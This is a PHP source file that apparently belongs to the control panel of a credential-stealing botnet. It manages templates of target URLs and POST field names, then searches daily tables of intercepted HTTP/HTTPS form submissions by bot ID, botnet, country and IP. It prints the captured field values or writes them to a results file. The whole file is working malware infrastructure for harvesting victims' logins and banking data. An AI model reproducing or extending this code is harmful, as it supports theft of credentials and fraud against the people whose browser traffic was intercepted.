<?php if(!defined('__INDEX__'))die();
$edit_a=PRIV&PRIV_LOGS_DBT_EDIT;
if($edit_a&&(isset($_GET['new'])||(isset($_GET['edit'])&&is_numeric($_GET['edit']))))
{
  $nw=isset($_GET['new']);
  $name=isset($_POST['name'])?$_POST['name']:'';
  $url=isset($_POST['url'])?$_POST['url']:'';;
  $pd=isset($_POST['pd'])?$_POST['pd']:'';;
  
  if(strlen($name)>0&&strlen($url)>0&&strlen($pd)>0)
  {
    $ok=1;
    if(($r=mysql_query('SELECT id FROM '.TABLE_TMPS.' WHERE name=\''.addslashes($name).'\' LIMIT 1'))&&mysql_affected_rows()==1)
    {
      if($nw||(($m=mysql_fetch_row($r))&&$m[0]!=$_GET['edit'])){SetError(1);$ok=0;}
    }

    if($ok)
    {
      if($nw)mysql_query('INSERT '.TABLE_TMPS.' SET name=\''.addslashes($name).'\',url=\''.addslashes($url).'\',pd=\''.addslashes($pd).'\'');
      else mysql_query('UPDATE '.TABLE_TMPS.' SET name=\''.addslashes($name).'\',url=\''.addslashes($url).'\',pd=\''.addslashes($pd).'\' WHERE id='.$_GET['edit'].' LIMIT 1');
      header('Location: '.QUERY_STRING.'&tmp='.($nw?mysql_insert_id():$_GET['edit']));
      die();
    }
  }
  else if(!$nw)
  {
    $r=mysql_query('SELECT name,url,pd FROM '.TABLE_TMPS.' WHERE id='.$_GET['edit'].' LIMIT 1');
    if($r&&($m=mysql_fetch_row($r))){$name=$m[0];$url=$m[1];$pd=$m[2];}
    else{HTMLBegin(LNG_MDBTLOGS_EDIT,'');print LNG_MDBTLOGS_NOTFOUNDED;HTMLEnd();die();}
  }
  
  HTMLBegin($nw?LNG_MDBTLOGS_NEW:LNG_MDBTLOGS_EDIT,'');
  ShowError('LNG_MDBTLOGS_ERROR_');
  print '<form method="POST" action="'.QUERY_STRING.'&'.($nw?'new':'edit='.$_GET['edit']).'"><table class="tbl1" width="300"><tr><td class="td1" colspan="2">'.($nw?LNG_MDBTLOGS_NEW:LNG_MDBTLOGS_EDIT).'</td></tr>'.
        '<tr><td nowrap>'.LNG_MDBTLOGS_NAME.'</td><td width="100%"><input type="text" name="name" value="'.htmlentities($name).'" style="width:100%"></td></tr>'.
        '<tr><td colspan="2"><table class="tbl1" width="100%"><tr><td nowrap>'.LNG_MDBTLOGS_URL.'</td><td width="100%"><input type="text" name="url" value="'.htmlentities($url).'" style="width:100%"></td></tr>'.
        '<tr><td nowrap>'.LNG_MDBTLOGS_PD.'</td><td width="100%"><input type="text" name="pd" value="'.htmlentities($pd).'" style="width:100%"></td></tr>'.
        '</table></tr></td><tr><td colspan="2" align="right"><input type="submit" class="ism" value="'.($nw?LNG_MDBTLOGS_BNEW:LNG_MDBTLOGS_BEDIT).'">&nbsp;<input onClick="window.location.href=\''.QUERY_STRING.'\'" type="button" class="ism" value="'.LNG_MDBTLOGS_BBACK.'"></tr></td></table></form>';
  HTMLEnd();
  die();  
}
else if($edit_a&&isset($_GET['del'])&&is_numeric($_GET['del']))
{
  mysql_query('DELETE FROM '.TABLE_TMPS.' WHERE id='.$_GET['del'].' LIMIT 1');
  header('Location: '.QUERY_STRING);
  die();  
}

$sy=2006;
$cur=time();
$prev=$cur;//-86400;

$d1=(isset($_GET['d1'])&&is_numeric($_GET['d1'])&&$_GET['d1']>0&&$_GET['d1']<32)?$_GET['d1']:ftime('d',$prev);
$d2=(isset($_GET['d2'])&&is_numeric($_GET['d2'])&&$_GET['d2']>0&&$_GET['d2']<32)?$_GET['d2']:ftime('d',$cur);
$m1=(isset($_GET['m1'])&&is_numeric($_GET['m1'])&&$_GET['m1']>0&&$_GET['m1']<13)?$_GET['m1']:ftime('m',$prev);
$m2=(isset($_GET['m2'])&&is_numeric($_GET['m2'])&&$_GET['m2']>0&&$_GET['m2']<13)?$_GET['m2']:ftime('m',$cur);
$y1=(isset($_GET['y1'])&&is_numeric($_GET['y1']))?$_GET['y1']:ftime('Y',$prev);
$y2=(isset($_GET['y2'])&&is_numeric($_GET['y2']))?$_GET['y2']:ftime('Y',$cur);
$time1=fmktime(0,0,0,$m1,$d1,$y1);
$time2=fmktime(23,59,59,$m2,$d2,$y2);

$bns=isset($_GET['bns'])?trim($_GET['bns']):'';
$cids=isset($_GET['cids'])?trim($_GET['cids']):'';
$cnts=isset($_GET['cnts'])?trim($_GET['cnts']):'';
$ips=isset($_GET['ips'])?trim($_GET['ips']):'';
$cont=isset($_GET['cont'])?trim($_GET['cont']):'';
$tmp=isset($_GET['tmp'])&&is_numeric($_GET['tmp'])?$_GET['tmp']:0;
$om=(isset($_GET['om'])&&$_GET['om']>=0&&$_GET['om']<3?$_GET['om']:0);

$needsearch=$tmp>0&&isset($_GET['d1'])&&isset($_GET['d2'])&&isset($_GET['m1'])&&isset($_GET['m2'])&&isset($_GET['y1'])&&isset($_GET['y2']);
if($om==1)header('Content-Type: text/plain; charset='.LNG_CODEPAGE);
else
{
  HTMLBegin(LNG_MDBTLOGS,$edit_a,'');

  print '<form method="GET" action="'.$_SERVER['PHP_SELF'].'"><input type="hidden" name="m" value="'.$module.'">';
  print '<table class="tbl1" width="1%"><tr><td class="td1" colspan="2">'.LNG_MDBTLOGS_FILTER.'</td></tr>'.
        '<tr><td align="left">'.LNG_MDBTLOGS_FILTER_TIMES.'</td><td nowrap align="left" width="100%">'.InputDate($d1,$m1,$y1,2006,'d1','m1','y1').'&nbsp;<b>&ndash;</b>&nbsp;'.InputDate($d2,$m2,$y2,2006,'d2','m2','y2').'</td></tr>'.
        '<tr><td colspan="2" align="center"><table class="tbl1">'.
        '<tr><td align="right">'.LNG_MDBTLOGS_FILTER_CNTS.'</td><td><input size="20" type="text" name="cnts" value="'.htmlentities($cnts).'"></td><td align="right" width="100%">'.LNG_MDBTLOGS_FILTER_CIDS.'</td><td><input size="20" type="text" name="cids" value="'.htmlentities($cids).'"></td></tr>'.
        '<tr><td align="right">'.LNG_MDBTLOGS_FILTER_BNS.'</td><td><input type="text" name="bns" value="'.htmlentities($bns).'" size="20"></td><td align="right">'.LNG_MDBTLOGS_FILTER_IPS.'</td><td><input type="text" name="ips" value="'.htmlentities($ips).'" size="20"></td></tr>'.
        '</table></td></tr><tr><td colspan="2"><table class="tbl1" width="100%">'.
        '<tr><td>'.LNG_MDBTLOGS_FILTER_TMP.'</td><td width="100%"><select name="tmp" style="width:100%">';

  if(($r=mysql_query('SELECT id,name FROM '.TABLE_TMPS.' ORDER BY name')))while($m=mysql_fetch_row($r))print '<option value="'.$m[0].'"'.($tmp==$m[0]?' selected':'').'>'.htmlentities($m[1]).'</option>';

  print '</select></td>';
  if($edit_a)print '<td nowrap><input onClick="window.location.href=\''.QUERY_STRING.'&edit=\'+tmp.options[tmp.selectedIndex].value;" type="button" class="ism" value="'.LNG_MDBTLOGS_FILTER_TEDIT.'">&nbsp;<input onClick="if(confirm(\''.LNG_MDBTLOGS_DELQ.'\'))window.location.href=\''.QUERY_STRING.'&del=\'+tmp.options[tmp.selectedIndex].value;" type="button" class="ism" value="'.LNG_MDBTLOGS_FILTER_TDEL.'">&nbsp;|&nbsp<input type="button" class="ism" value="'.LNG_MDBTLOGS_FILTER_TADD.'" onClick="window.location.href=\''.QUERY_STRING.'&new\';"></td>';
  print '</tr><tr><td align="right">'.LNG_MDBTLOGS_FILTER_MODE.'</td><td><select name="om">'.
        '<option value="0"'.($om==0?' selected':'').'>'.LNG_MDBTLOGS_FILTER_MODE1.'</option>'.
        '<option value="1"'.($om==1?' selected':'').'>'.LNG_MDBTLOGS_FILTER_MODE2.'</option>'.
        '<option value="2"'.($om==2?' selected':'').'>'.LNG_MDBTLOGS_FILTER_MODE3.'</option>'.
        '</select></tr></table></td></tr><tr><td align="left"><input class="ism" type="reset" value="'.LNG_MDBTLOGS_FILTER_RESET.'"></td><td align="right"><input class="ism" type="submit" value="'.LNG_MDBTLOGS_FILTER_SEARCH.'"></td></tr></table></form>';
}
if(!$needsearch){if($om!=1)HTMLEnd();die();}

$r=mysql_query('SELECT url, pd FROM '.TABLE_TMPS.' WHERE id='.$tmp.' LIMIT 1');
if(!$r||mysql_affected_rows()!=1||!($m=mysql_fetch_row($r)))
{
  print LNG_MDBTLOGS_NOTFOUNDED;
  if($om!=1)HTMLEnd();
  die();
}

if(strpos($m[0],'https://')===0)$options='type=\''.LOGTYPE_HTTPS_POST.'\' ';
else if(strpos($m[0],'http://')===0)$options='type=\''.LOGTYPE_HTTP_POST.'\' ';
else $options='(type=\''.LOGTYPE_HTTPS_POST.'\' OR type=\''.LOGTYPE_HTTP_POST.'\')';

if($cids!='')$options.=Str2Option('comp_id',addslashes(mask2sql($cids)));
if($bns!='')$options.=Str2Option('bn',addslashes($bns));
if($cnts!='')$options.=Str2Option('country',addslashes($cnts));
if($ips!='')$options.=Str2Option('ip',addslashes(mask2sql($ips)));

$PD_LIST=array();
$options.=' AND log LIKE BINARY \''.addslashes(mask2sql($m[0]))."\n%' ";
if(strstr($m[1],',')===FALSE){$options.="AND log LIKE BINARY '%\n".addslashes($m[1]).'=%\'';$PD_LIST[]=$m[1];}
else{$l=explode(',',$m[1]);foreach($l as $k){$k=trim($k);if(strlen($k)>0){$options.="AND log LIKE BINARY '%\n".addslashes($k).'=%\' ';$PD_LIST[]=$k;}}}

$table_min=intval(ftime('ymd',$time1));
$table_max=intval(ftime('ymd',$time2));
$tbf=TABLE_LOGS.'_';
$ll=strlen($tbf);

$query='SELECT HIGH_PRIORITY id,comp_id,country,ip,log FROM ';
if($om!=1)print '<div class="td1" style="width:100%" align="left">'.LNG_MDBTLOGS_RESULT.'</div>';
$dblogs=$_SERVER['PHP_SELF'].'?m=dblogs';

$file=null;
if($om==2&&!($file=@fopen('result.txt','a')))
{
  print '<b>'.LNG_MDBTLOGS_ERROR1.'</b>';
  HTMLEnd();
  die();  
}

if(($r=mysql_list_tables(MYSQL_DB)))while(($m=mysql_fetch_array($r)))if(strncmp($tbf,$m[0],$ll)===0&&($th=substr($m[0],$ll))>=$table_min&&$th<=$table_max)
{
  $_d=substr($th,4,2);$_m=substr($th,2,2);$_y=substr($th,0,2)+2000;
  $time=ftime(LNG_FORMAT_DATA,fmktime(0,0,0,$_m,$_d,$_y)+date('Z'));
  if($om==1)print str_repeat('=',20).' '.$time.' '.str_repeat('=',20)."\n";
  else
  {
    $dd='&d1='.$_d.'&d2='.$d2.'&m1='.$_m.'&m2='.$m2.'&y1='.$_y.'&y2='.$y2.'&om=1';
    print '<br><br><div class="td1" style="width:96%" align="left">'.$time.'</div>';
    if($om==2)fwrite($file, str_repeat('=',20).' '.$time.' '.str_repeat('=',20)."\n");
  }
  flush();
  
  $rr=mysql_query($query.$m[0].' WHERE '.$options.' ORDER BY comp_id');
  if(($total=$rr?mysql_affected_rows():0)==0)
  {
    if($om==1)print "-\n";
    else
    {
      print '<div class="tbl1" style="width:94%" align="center"><i>'.LNG_MDBTLOGS_RESULT_NONE.'</i></div>';
      if($om==2)fwrite($file, "-\n");
    }
    continue;
  }
  $lcid='';
  while($m=mysql_fetch_row($rr))
  {
    if($lcid!=$m[1])
    {
      if($om!=0)
      {
        $ff=sprintf(LNG_MDBTLOGS_TXT_I1,$m[1],$m[2],$m[3])."\n\n";
        if($om==1)print $ff;
        else fwrite($file, $ff);
      }
      else
      {
        if($lcid!='')print '</div>';
        print '<div class="tbl1" style="width:94%" align="left"><a target="_blank" href="'.$dblogs.'&cids='.urlencode($m[1]).$dd.'" class="ca">'.htmlentities($m[1]).'</a><br>'.$m[2].', '.$m[3].'<br>';
      }
      $lcid=$m[1];  
    }
    if($om==0)print '<br><a target="_blank" href="'.$dblogs.'&t='.$th.'&id='.$m[0].'">[+]</a> ';
    $st=trim($m[4]);
    if(($t=strpos($st,'://'))&&($f=strpos($st,"\n",$t+3)))
    {
      $ff=substr($st,0,$f);
      if($om==1)print $ff."\n";
      else if($om==2)fwrite($file, $ff."\n");
      else print htmlentities($ff);
    }
    else
    {
      if($om==1)print $st."\n";
      else if($om==2)fwrite($file,$st."\n");
      else
      {
        print htmlentities($st);
        if($t&&!$f)print '...';
      }
    }
    foreach($PD_LIST as $l)
    {
      if(($s1=strpos($st,"\n".$l.'='))!==FALSE)
      {
        $s1+=strlen($l)+2;
        $s2=strpos($st,"\n",$s1);
        $ff=(($s2)?substr($st,$s1,$s2-$s1):substr($st,$s1));
        if($om==1)print $l.': '.$ff."\n";
        else if($om==2)fwrite($file,$l.': '.$ff."\n");
        else print '<br><b>'.$l.':</b>&nbsp;'.$ff;
      }
    }
    if($om==1)print "\n";
    else if($om==2)fwrite($file,"\n");
    else print '<br>';
  }
  if($om==2)print '<div class="tbl1" style="width:94%" align="center">'.sprintf(LNG_MDBTLOGS_WRITED,$total).'</div>';
  if($lcid&&$om!=1)print '</div>';
}
if($om!=1)HTMLEnd();
if($om==2)fclose($file);

function InputDate($d,$m,$y,$y_start,$d_name,$m_name,$y_name){$data='<select name="'.$d_name.'">';for($i=1;$i<32;$i++)$data.='<option value="'.$i.'"'.($i==$d?' selected':'').'>'.$i.'</option>';$data.='</select><b>&nbsp;.&nbsp;</b><select name="'.$m_name.'">';for($i=1;$i<13;$i++)$data.='<option value="'.$i.'"'.($i==$m?' selected':'').'>'.$i.'</option>';$data.='</select><b>&nbsp;.&nbsp;</b><select name="'.$y_name.'">';$yl=gmdate('Y',time())+1;for($i=$y_start;$i<$yl;$i++)$data.='<option value="'.$i.'"'.($i==$y?' selected':'').'>'.$i.'</option>';return $data.'</select>';}
function Str2Option($name,$data,$f){if($data=='')return '';if(strstr($data,',')===FALSE)return ($f?' AND ':' ').$name.' LIKE BINARY \''.$data.'\'';$cc=count(($data=explode(',',$data)));$str=$f?' AND (':' (';for($i=0;$i<$cc;$i++){if($i>0)$str.=' OR ';$str.= $name.' LIKE BINARY \''.trim($data[$i]).'%\'';}return $str.')';}
function TxtOS($os){$v=explode('.',$os);return count($v)==4?sprintf(LNG_MDBTLOGS_LOG_WVERD,$v[0],$v[1],$v[2],$v[3]):'-';}
function TxtTC($tc){$tc/=1000;return sprintf('%02u:%02u:%02u',$tc/3600,$tc/60-(sprintf('%u',($tc/3600))*60),$tc-(sprintf('%u',($tc/60))*60));}
function TxtGMT($g){return ($g>0?'+':'-').abs(intval($g/60)).':'.sprintf('%02u',abs(intval($g%60)));}
?>